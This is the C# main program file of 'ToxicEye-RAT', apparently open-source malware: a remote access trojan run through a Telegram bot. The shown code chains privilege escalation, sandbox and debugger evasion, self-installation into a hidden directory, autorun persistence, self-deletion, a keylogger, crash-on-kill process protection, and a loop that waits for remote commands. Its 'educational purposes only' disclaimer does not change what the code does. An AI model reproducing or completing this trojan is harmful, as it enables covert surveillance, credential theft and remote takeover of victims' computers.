/* 
       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https:github.com/LimerBoy

       > This program is distributed for educational purposes only.
*/


using System;
using System.Net;

namespace TelegramRAT
{
    class Program
    {
        [STAThreadAttribute]
        static void Main(string[] args)
        {

            // Hide console
            persistence.HideConsoleWindow();
            // Mutex check
            persistence.CheckMutex();
            // SSL
            ServicePointManager.SecurityProtocol = (
                SecurityProtocolType.Ssl3 |
                SecurityProtocolType.Tls |
                SecurityProtocolType.Tls11 |
                SecurityProtocolType.Tls12
            );
            // Get admin rights
            persistence.elevatePrevileges();
            // Delay before starting
            persistence.Sleep();
            // Check if on VirtualBox, Sandbox or Debugger
            persistence.runAntiAnalysis();
            // Install to system & hide directory
            persistence.installSelf();
            // Add to startup
            persistence.setAutorun();
            // Delete file after first start
            persistence.MeltFile();
            // Check internet connection
            utils.isConnectedToInternet();
            // Send 'online' to telegram bot
            telegram.sendConnection();
            // Start offline keylogger
            utils.keyloggerThread.Start();
            // Protect process (BSOD)
            persistence.protectProcess();
            persistence.PreventSleep();
            // Check for blocked process
            persistence.processCheckerThread.Start();
            // Wait for new commands
            telegram.waitCommandsThread.Start();
            // Need for system power events
            var shutdownForm = new persistence.MainForm();
            System.Windows.Forms.Application.Run(shutdownForm);
        }
    }
}
